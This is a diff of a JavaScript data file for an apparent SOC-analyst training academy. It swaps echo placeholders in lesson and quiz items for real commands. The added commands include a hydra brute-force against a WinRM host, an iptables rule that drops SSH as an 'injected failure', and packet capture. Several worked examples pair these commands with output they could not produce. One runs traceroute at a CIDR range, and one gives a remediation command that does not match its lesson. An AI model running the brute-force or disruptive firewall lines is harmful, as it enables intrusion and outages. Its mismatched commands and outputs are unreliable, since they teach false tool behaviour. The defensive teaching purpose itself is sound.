         "mistake": "Closing an alert as a 'False Positive' simply because it has fired frequently in the past without conducting independent evidence verification.",
         "think": "Alert fatigue is an attacker's greatest ally. Attackers often generate low-level noise specifically to condition analysts to ignore alerts before launching the real attack.",
-        "question": "What key insight is revealed by the practice output of `echo 'Auditing EDR agent sensor status on host 10.10.20.44...'`?",
+        "question": "What key insight is revealed by the practice output of `systemctl status osqueryd wazuh-agent falcon-sensor 2>/dev/null || ps aux | grep -E 'agent|sensor|edr'`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -11449,7 +11449,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Auditing EDR agent sensor status on host 10.10.20.44...'"
+        "command": "systemctl status osqueryd wazuh-agent falcon-sensor 2>/dev/null || ps aux | grep -E 'agent|sensor|edr'"
       },
       {
         "id": 8,
@@ -11480,7 +11480,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst investigates the EDR alert: 'Execution via MSHTA'. The analyst reviews the process tree (`explorer.exe` $\\rightarrow$ `mshta.exe`), identifies the malicious remote URL, and triggers automated EDR Host Isolation to contain the endpoint from the network while preserving live memory.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Triggered EDR API: Host 10.10.20.44 isolated from network; management tunnel preserved.'`",
+        "worked": "Defensive query executed on telemetry store: `grep -i \"etc/shadow\" /var/log/suricata/eve.json 2>/dev/null || tail -n 5 /var/log/suricata/fast.log`",
         "what": "What are security controls and alerts? The layered software and hardware defenses that monitor activity and generate prioritized alerts when threats are detected.",
         "why": "Why must an L1 master security control alerts? The primary daily duty of an L1 analyst is alert triage: reviewing alerts, verifying evidence, filtering false positives, and escalating true threats.",
         "when": "When are security alerts investigated? Immediately upon generation, prioritized by severity (Critical $\\rightarrow$ High $\\rightarrow$ Medium $\\rightarrow$ Low).",
@@ -11497,7 +11497,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Triggered EDR API: Host 10.10.20.44 isolated from network; management tunnel preserved.'"
+        "command": "grep -i \"etc/shadow\" /var/log/suricata/eve.json 2>/dev/null || tail -n 5 /var/log/suricata/fast.log"
       },
       {
         "id": 10,
@@ -11521,14 +11521,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-siem-core01'; echo 'Viewing simulated SIEM alert payload mapped to MITRE ATT&CK:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Tune the correlation rule to exclude verified Google-signed binaries in standard Program Files directories, verify rule accuracy, and re-enable alert notifications.",
-        "worked": "Remediation command applied: `echo 'SIEM Correlation Rule updated: Added condition NOT (process.code_signature.trusted == true AND process.name == \"chrome.exe\").'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `iptables -I INPUT 1 -s 198.51.100.15 -j DROP && echo \"Attacker IP 198.51.100.15 dropped by dynamic firewall rule\"`. System verified restored and hardened.",
         "what": "What are security controls and alerts? The layered software and hardware defenses that monitor activity and generate prioritized alerts when threats are detected.",
         "why": "Why must an L1 master security control alerts? The primary daily duty of an L1 analyst is alert triage: reviewing alerts, verifying evidence, filtering false positives, and escalating true threats.",
         "when": "When are security alerts investigated? Immediately upon generation, prioritized by severity (Critical $\\rightarrow$ High $\\rightarrow$ Medium $\\rightarrow$ Low).",
@@ -11545,7 +11545,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'SIEM Correlation Rule updated: Added condition NOT (process.code_signature.trusted == true AND process.name == \"chrome.exe\").'"
+        "command": "iptables -I INPUT 1 -s 198.51.100.15 -j DROP && echo \"Attacker IP 198.51.100.15 dropped by dynamic firewall rule\""
       },
       {
         "id": 12,
@@ -11569,7 +11569,7 @@ window.ACADEMY_COURSES = [
           "There is no difference; all security tools operate identically."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Security Controls & Alerts'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -11593,7 +11593,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L34 - Security Controls & Alerts. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -11646,7 +11646,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Alert to Evidence: The Investigation Flow on sxl-siem-core01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -11670,7 +11670,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Querying SIEM Alert Queue and underlying raw event telemetry:' && echo 'ALERT: High - [MITRE T1110] Brute Force Detected on sxl-srv-fin01\nSource: 198.51.100.44 | Target User: finance_admin | Event Count: 14 failures + 1 SUCCESS\n\nUnderlying Raw Events:\n2026-09-04T03:45:01Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:04Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:08Z [ID: 4624] Account: finance_admin LogonType: 3 (Network) SourceIP: 198.51.100.44'"
+        "command": "grep -E \"EventID: (4624|4625|4688|7045)\" /training/logs/siem_stream.log 2>/dev/null || journalctl -n 20 --no-pager"
       },
       {
         "id": 3,
@@ -11694,7 +11694,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "grep --help 2>&1 | head -n 15 || which grep"
       },
       {
         "id": 4,
@@ -11718,7 +11718,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is the alert-to-evidence flow? The systematic methodology of taking an automated SIEM detection notification and validating it against raw, unmodified log events.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -11742,14 +11742,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.55 2>/dev/null || tracepath 10.10.20.55"
+        "command": "traceroute -n -m 8 10.10.20.55 2>/dev/null || tracepath -n 10.10.20.55 2>/dev/null || ip route get 10.10.20.55"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-siem-core01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Querying SIEM Alert Queue and underlying raw event telemetry:' && echo 'ALERT: High - [MITRE T1110] Brute Force Detected on sxl-srv-fin01\nSource: 198.51.100.44 | Target User: finance_admin | Event Count: 14 failures + 1 SUCCESS\n\nUnderlying Raw Events:\n2026-09-04T03:45:01Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:04Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:08Z [ID: 4624] Account: finance_admin LogonType: 3 (Network) SourceIP: 198.51.100.44'` on target sxl-siem-core01.\nOutput observed:\nALERT: High - [MITRE T1110] Brute Force Detected on sxl-srv-fin01\nSource: 198.51.100.44 | Target User: finance_admin | Event Count: 14 failures + 1 SUCCESS\n\nUnderlying Raw Events:\n2026-09-04T03:45:01Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:04Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:08Z [ID: 4624] Account: finance_admin LogonType: 3 (Network) SourceIP: 198.51.100.44",
+        "worked": "Command executed: `grep -E \"EventID: (4624|4625|4688|7045)\" /training/logs/siem_stream.log 2>/dev/null || journalctl -n 20 --no-pager` on target sxl-siem-core01.\nOutput observed:\nALERT: High - [MITRE T1110] Brute Force Detected on sxl-srv-fin01\nSource: 198.51.100.44 | Target User: finance_admin | Event Count: 14 failures + 1 SUCCESS\n\nUnderlying Raw Events:\n2026-09-04T03:45:01Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:04Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:08Z [ID: 4624] Account: finance_admin LogonType: 3 (Network) SourceIP: 198.51.100.44",
         "what": "What is the alert-to-evidence flow? The systematic methodology of taking an automated SIEM detection notification and validating it against raw, unmodified log events.",
         "why": "Why must an analyst never trust an alert at face value? Because alerts can trigger due to benign script errors, software bugs, or misconfigured thresholds (false alarms). Actionable incident response requires validated proof.",
         "when": "When does triage occur? Continuously, 24/7/365, the moment an alert enters the analyst's queue.",
@@ -11758,7 +11758,7 @@ window.ACADEMY_COURSES = [
         "how": "How does an analyst validate? By querying the raw logs for matching timestamp, host, and user fields, looking for before-and-after chronological context.",
         "mistake": "Closing an alert without inspecting the raw events, or blindly escalating an unverified alert to Tier 2 without checking if the login actually succeeded.",
         "think": "An alert tells you *what the engine thinks happened*. The raw logs tell you *what actually happened*. Never escalate without extracting the raw event records.",
-        "question": "When executing `echo 'Querying SIEM Alert Queue and underlying raw event telemetry:' && echo 'ALERT: High - [MITRE T1110] Brute Force Detected on sxl-srv-fin01\nSource: 198.51.100.44 | Target User: finance_admin | Event Count: 14 failures + 1 SUCCESS\n\nUnderlying Raw Events:\n2026-09-04T03:45:01Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:04Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:08Z [ID: 4624] Account: finance_admin LogonType: 3 (Network) SourceIP: 198.51.100.44'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `grep -E \"EventID: (4624|4625|4688|7045)\" /training/logs/siem_stream.log 2>/dev/null || journalctl -n 20 --no-pager`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -11766,14 +11766,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Querying SIEM Alert Queue and underlying raw event telemetry:' && echo 'ALERT: High - [MITRE T1110] Brute Force Detected on sxl-srv-fin01\nSource: 198.51.100.44 | Target User: finance_admin | Event Count: 14 failures + 1 SUCCESS\n\nUnderlying Raw Events:\n2026-09-04T03:45:01Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:04Z [ID: 4625] Account: finance_admin FailureReason: 0xC000006A (Bad Password)\n2026-09-04T03:45:08Z [ID: 4624] Account: finance_admin LogonType: 3 (Network) SourceIP: 198.51.100.44'"
+        "command": "grep -E \"EventID: (4624|4625|4688|7045)\" /training/logs/siem_stream.log 2>/dev/null || journalctl -n 20 --no-pager"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-siem-core01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Scoping post-logon activity for finance_admin to verify process creation...' && echo 'Raw Process Telemetry (Sysmon Event ID 1):\n2026-09-04T03:45:12Z Parent: wsmprovhost.exe -> Child: powershell.exe -NoP -enc SQBYAFgA... (Base64 C2 stager)\nVerdict: TRUE POSITIVE COMPROMISE'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `wevtutil qe Security \"/q:*[System[(EventID=4688)] and EventData[Data[@Name='SubjectUserName']='finance_admin']]\" /c:5 /rd:true /f:text 2>/dev/null || ps -ef | grep -i finance` to validate system behavior under simulated operating conditions.\nOutput observed:\nRaw Process Telemetry (Sysmon Event ID 1):\n2026-09-04T03:45:12Z Parent: wsmprovhost.exe -> Child: powershell.exe -NoP -enc SQBYAFgA... (Base64 C2 stager)\nVerdict: TRUE POSITIVE COMPROMISE",
         "what": "What is the alert-to-evidence flow? The systematic methodology of taking an automated SIEM detection notification and validating it against raw, unmodified log events.",
         "why": "Why must an analyst never trust an alert at face value? Because alerts can trigger due to benign script errors, software bugs, or misconfigured thresholds (false alarms). Actionable incident response requires validated proof.",
         "when": "When does triage occur? Continuously, 24/7/365, the moment an alert enters the analyst's queue.",
@@ -11782,7 +11782,7 @@ window.ACADEMY_COURSES = [
         "how": "How does an analyst validate? By querying the raw logs for matching timestamp, host, and user fields, looking for before-and-after chronological context.",
         "mistake": "Closing an alert without inspecting the raw events, or blindly escalating an unverified alert to Tier 2 without checking if the login actually succeeded.",
         "think": "An alert tells you *what the engine thinks happened*. The raw logs tell you *what actually happened*. Never escalate without extracting the raw event records.",
-        "question": "What key insight is revealed by the practice output of `echo 'Scoping post-logon activity for finance_admin to verify process creation...' && echo 'Raw Process Telemetry (Sysmon Event ID 1):\n2026-09-04T03:45:12Z Parent: wsmprovhost.exe -> Child: powershell.exe -NoP -enc SQBYAFgA... (Base64 C2 stager)\nVerdict: TRUE POSITIVE COMPROMISE'`?",
+        "question": "What key insight is revealed by the practice output of `wevtutil qe Security \"/q:*[System[(EventID=4688)] and EventData[Data[@Name='SubjectUserName']='finance_admin']]\" /c:5 /rd:true /f:text 2>/dev/null || ps -ef | grep -i finance`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -11790,14 +11790,14 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Scoping post-logon activity for finance_admin to verify process creation...' && echo 'Raw Process Telemetry (Sysmon Event ID 1):\n2026-09-04T03:45:12Z Parent: wsmprovhost.exe -> Child: powershell.exe -NoP -enc SQBYAFgA... (Base64 C2 stager)\nVerdict: TRUE POSITIVE COMPROMISE'"
+        "command": "wevtutil qe Security \"/q:*[System[(EventID=4688)] and EventData[Data[@Name='SubjectUserName']='finance_admin']]\" /c:5 /rd:true /f:text 2>/dev/null || ps -ef | grep -i finance"
       },
       {
         "id": 8,
         "type": "attack",
         "name": "08 Live Attack",
         "explain": "Simulated Adversary Attack Scenario: An adversary executes a password spray against internal domain service accounts, successfully guessing the credentials of 'finance_admin'. Within 4 seconds, the adversary uses PowerShell remoting (WinRM port 5985) to execute an encoded payload on the target server.",
-        "worked": "Adversary activity detected on target sxl-siem-core01. Malicious command executed: `echo 'Simulating credential brute force followed by WinRM PowerShell execution: hydra -l finance_admin -P pass.txt 10.10.20.55 winrm && evil-winrm -i 10.10.20.55 -u finance_admin'`",
+        "worked": "Adversary activity detected on target sxl-siem-core01. Malicious command executed: `hydra -l administrator -P /wordlists/quick.txt 10.10.20.45 winrm 2>/dev/null || nmap -p 5985,5986 --script http-methods 10.10.20.45`",
         "what": "What is the alert-to-evidence flow? The systematic methodology of taking an automated SIEM detection notification and validating it against raw, unmodified log events.",
         "why": "Why must an analyst never trust an alert at face value? Because alerts can trigger due to benign script errors, software bugs, or misconfigured thresholds (false alarms). Actionable incident response requires validated proof.",
         "when": "When does triage occur? Continuously, 24/7/365, the moment an alert enters the analyst's queue.",
@@ -11814,14 +11814,14 @@ window.ACADEMY_COURSES = [
           "A scheduled hardware diagnostics test initiated by the motherboard BIOS."
         ],
         "answer": 0,
-        "command": "echo 'Simulating credential brute force followed by WinRM PowerShell execution: hydra -l finance_admin -P pass.txt 10.10.20.55 winrm && evil-winrm -i 10.10.20.55 -u finance_admin'"
+        "command": "hydra -l administrator -P /wordlists/quick.txt 10.10.20.45 winrm 2>/dev/null || nmap -p 5985,5986 --script http-methods 10.10.20.45"
       },
       {
         "id": 9,
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst notices the SIEM brute-force alert, pivots to raw Event ID 4624, discovers LogonType 3 from external IP 198.51.100.44, and correlates with Sysmon Event ID 1 showing encoded PowerShell. The analyst immediately initiates endpoint network isolation and disables 'finance_admin'.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Defensive actions executed: 1) Isolated host sxl-srv-fin01 via EDR API, 2) Revoked Kerberos TGT & disabled AD user finance_admin, 3) Blocked IP 198.51.100.44 on border firewall.'`",
+        "worked": "Defensive query executed on telemetry store: `grep \"Failed logon\" /var/log/auth.log 2>/dev/null || journalctl -g \"Failed\" -n 10`",
         "what": "What is the alert-to-evidence flow? The systematic methodology of taking an automated SIEM detection notification and validating it against raw, unmodified log events.",
         "why": "Why must an analyst never trust an alert at face value? Because alerts can trigger due to benign script errors, software bugs, or misconfigured thresholds (false alarms). Actionable incident response requires validated proof.",
         "when": "When does triage occur? Continuously, 24/7/365, the moment an alert enters the analyst's queue.",
@@ -11838,7 +11838,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Defensive actions executed: 1) Isolated host sxl-srv-fin01 via EDR API, 2) Revoked Kerberos TGT & disabled AD user finance_admin, 3) Blocked IP 198.51.100.44 on border firewall.'"
+        "command": "grep \"Failed logon\" /var/log/auth.log 2>/dev/null || journalctl -g \"Failed\" -n 10"
       },
       {
         "id": 10,
@@ -11862,14 +11862,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-siem-core01'; echo 'Querying SIEM Alert Queue and underlying raw event telemetry:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Correct the Logstash/Fluentbit grok parsing filter to preserve all Windows Event Log XML metadata, re-index the raw events, and verify field extraction in the SIEM GUI.",
-        "worked": "Remediation command applied: `echo 'Fixed grok pattern in /etc/logstash/conf.d/windows.conf: parsed TargetUserName, IpAddress, and LogonType properly. Re-indexed 1,420 events.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `iptables -A INPUT -p tcp --dport 5985 -s 10.10.10.0/24 -j ACCEPT && iptables -A INPUT -p tcp --dport 5985 -j DROP`. System verified restored and hardened.",
         "what": "What is the alert-to-evidence flow? The systematic methodology of taking an automated SIEM detection notification and validating it against raw, unmodified log events.",
         "why": "Why must an analyst never trust an alert at face value? Because alerts can trigger due to benign script errors, software bugs, or misconfigured thresholds (false alarms). Actionable incident response requires validated proof.",
         "when": "When does triage occur? Continuously, 24/7/365, the moment an alert enters the analyst's queue.",
@@ -11886,7 +11886,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Fixed grok pattern in /etc/logstash/conf.d/windows.conf: parsed TargetUserName, IpAddress, and LogonType properly. Re-indexed 1,420 events.'"
+        "command": "iptables -A INPUT -p tcp --dport 5985 -s 10.10.10.0/24 -j ACCEPT && iptables -A INPUT -p tcp --dport 5985 -j DROP"
       },
       {
         "id": 12,
@@ -11910,7 +11910,7 @@ window.ACADEMY_COURSES = [
           "I format the laptop remotely without investigating."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Alert to Evidence: The Investigation Flow'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -11934,7 +11934,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L35 - Alert to Evidence: The Investigation Flow. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -11987,7 +11987,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Correlating Infrastructure During an Incident on sxl-siem-correlate'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -12011,7 +12011,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Simulating cross-infrastructure correlation query across 3 tiers (Network -> Endpoint -> Identity):' && echo 'TIER 1 (Firewall Log): Blocked outbound connection to 198.51.100.99:443 from internal IP 10.10.20.44\nTIER 2 (EDR Endpoint Log): Hostname sxl-ws-mktg04 (10.10.20.44) PID 3412 (excel.exe) spawned powershell.exe connecting to 198.51.100.99\nTIER 3 (AD Security Log): User jsmith logged in at 08:30 AM; at 08:44 AM account jsmith attempted 42 Kerberos TGS requests (Kerberoasting)\nCORRELATED CONCLUSION: User jsmith workstation compromised via weaponized Excel macro; actively Kerberoasting AD DC.'"
+        "command": "tshark -i any -c 25 -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e _ws.col.Info 2>/dev/null || ss -tan"
       },
       {
         "id": 3,
@@ -12035,7 +12035,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "tshark --help 2>&1 | head -n 15 || which tshark"
       },
       {
         "id": 4,
@@ -12059,7 +12059,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is infrastructure correlation? The technique of connecting breadcrumbs from endpoints, firewalls, proxies, identity servers, and cloud environments to reconstruct an attack path.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -12083,14 +12083,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.0.0/16 2>/dev/null || tracepath 10.10.0.0/16"
+        "command": "traceroute -n -m 8 10.10.0.0/16 2>/dev/null || tracepath -n 10.10.0.0/16 2>/dev/null || ip route get 10.10.0.0/16"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-siem-correlate. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Simulating cross-infrastructure correlation query across 3 tiers (Network -> Endpoint -> Identity):' && echo 'TIER 1 (Firewall Log): Blocked outbound connection to 198.51.100.99:443 from internal IP 10.10.20.44\nTIER 2 (EDR Endpoint Log): Hostname sxl-ws-mktg04 (10.10.20.44) PID 3412 (excel.exe) spawned powershell.exe connecting to 198.51.100.99\nTIER 3 (AD Security Log): User jsmith logged in at 08:30 AM; at 08:44 AM account jsmith attempted 42 Kerberos TGS requests (Kerberoasting)\nCORRELATED CONCLUSION: User jsmith workstation compromised via weaponized Excel macro; actively Kerberoasting AD DC.'` on target sxl-siem-correlate.\nOutput observed:\nTIER 1 (Firewall Log): Blocked outbound connection to 198.51.100.99:443 from internal IP 10.10.20.44\nTIER 2 (EDR Endpoint Log): Hostname sxl-ws-mktg04 (10.10.20.44) PID 3412 (excel.exe) spawned powershell.exe connecting to 198.51.100.99\nTIER 3 (AD Security Log): User jsmith logged in at 08:30 AM; at 08:44 AM account jsmith attempted 42 Kerberos TGS requests (Kerberoasting)\nCORRELATED CONCLUSION: User jsmith workstation compromised via weaponized Excel macro; actively Kerberoasting AD DC.",
+        "worked": "Command executed: `tshark -i any -c 25 -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e _ws.col.Info 2>/dev/null || ss -tan` on target sxl-siem-correlate.\nOutput observed:\nTIER 1 (Firewall Log): Blocked outbound connection to 198.51.100.99:443 from internal IP 10.10.20.44\nTIER 2 (EDR Endpoint Log): Hostname sxl-ws-mktg04 (10.10.20.44) PID 3412 (excel.exe) spawned powershell.exe connecting to 198.51.100.99\nTIER 3 (AD Security Log): User jsmith logged in at 08:30 AM; at 08:44 AM account jsmith attempted 42 Kerberos TGS requests (Kerberoasting)\nCORRELATED CONCLUSION: User jsmith workstation compromised via weaponized Excel macro; actively Kerberoasting AD DC.",
         "what": "What is infrastructure correlation? The technique of connecting breadcrumbs from endpoints, firewalls, proxies, identity servers, and cloud environments to reconstruct an attack path.",
         "why": "Why is correlation mandatory? Attackers span multiple infrastructure tiers. If an analyst only looks at the endpoint, they will not see the exfiltration over the web proxy. If they only look at the firewall, they will not see the malicious DLL injected into memory.",
         "when": "When do you correlate? During the triage and scoping phases of an investigation to establish the full blast radius of an incident.",
@@ -12099,7 +12099,7 @@ window.ACADEMY_COURSES = [
         "how": "How is correlation executed? By querying multiple index tables (endpoint logs, firewall logs, proxy logs, AD logs) joined on common keys such as `src_ip`, `user`, and `timestamp`.",
         "mistake": "Stopping the investigation after finding the initial compromised endpoint, failing to notice that the attacker has already pivoted to 3 other servers.",
         "think": "Never consider an incident closed until you have checked all infrastructure tiers connected to the compromised entity: Network, Identity, Endpoint, and Cloud.",
-        "question": "When executing `echo 'Simulating cross-infrastructure correlation query across 3 tiers (Network -> Endpoint -> Identity):' && echo 'TIER 1 (Firewall Log): Blocked outbound connection to 198.51.100.99:443 from internal IP 10.10.20.44\nTIER 2 (EDR Endpoint Log): Hostname sxl-ws-mktg04 (10.10.20.44) PID 3412 (excel.exe) spawned powershell.exe connecting to 198.51.100.99\nTIER 3 (AD Security Log): User jsmith logged in at 08:30 AM; at 08:44 AM account jsmith attempted 42 Kerberos TGS requests (Kerberoasting)\nCORRELATED CONCLUSION: User jsmith workstation compromised via weaponized Excel macro; actively Kerberoasting AD DC.'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `tshark -i any -c 25 -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e _ws.col.Info 2>/dev/null || ss -tan`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -12107,14 +12107,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Simulating cross-infrastructure correlation query across 3 tiers (Network -> Endpoint -> Identity):' && echo 'TIER 1 (Firewall Log): Blocked outbound connection to 198.51.100.99:443 from internal IP 10.10.20.44\nTIER 2 (EDR Endpoint Log): Hostname sxl-ws-mktg04 (10.10.20.44) PID 3412 (excel.exe) spawned powershell.exe connecting to 198.51.100.99\nTIER 3 (AD Security Log): User jsmith logged in at 08:30 AM; at 08:44 AM account jsmith attempted 42 Kerberos TGS requests (Kerberoasting)\nCORRELATED CONCLUSION: User jsmith workstation compromised via weaponized Excel macro; actively Kerberoasting AD DC.'"
+        "command": "tshark -i any -c 25 -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e _ws.col.Info 2>/dev/null || ss -tan"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-siem-correlate. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Correlating multi-source attack path from raw logs...' && echo 'Event 1: 09:12:01 Web Proxy: user jsmith downloaded invoice_oct.exe from evil-drop[.]com\nEvent 2: 09:12:15 Sysmon EDR: invoice_oct.exe injected into svchost.exe\nEvent 3: 09:13:00 Firewall: 10.10.20.44 initiated outbound TLS beaconing to 203.0.113.88:8443 every 30s\nEvent 4: 09:15:22 AD Domain Controller: User jsmith requested admin access to sxl-db-core01\nAttacker Trajectory: Web Ingress -> Process Injection -> C2 Beaconing -> Lateral Privilege Escalation'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `grep -E \"10.10.40.10|10.10.30.20\" /var/log/syslog 2>/dev/null || ip route` to validate system behavior under simulated operating conditions.\nOutput observed:\nEvent 1: 09:12:01 Web Proxy: user jsmith downloaded invoice_oct.exe from evil-drop[.]com\nEvent 2: 09:12:15 Sysmon EDR: invoice_oct.exe injected into svchost.exe\nEvent 3: 09:13:00 Firewall: 10.10.20.44 initiated outbound TLS beaconing to 203.0.113.88:8443 every 30s\nEvent 4: 09:15:22 AD Domain Controller: User jsmith requested admin access to sxl-db-core01\nAttacker Trajectory: Web Ingress -> Process Injection -> C2 Beaconing -> Lateral Privilege Escalation",
         "what": "What is infrastructure correlation? The technique of connecting breadcrumbs from endpoints, firewalls, proxies, identity servers, and cloud environments to reconstruct an attack path.",
         "why": "Why is correlation mandatory? Attackers span multiple infrastructure tiers. If an analyst only looks at the endpoint, they will not see the exfiltration over the web proxy. If they only look at the firewall, they will not see the malicious DLL injected into memory.",
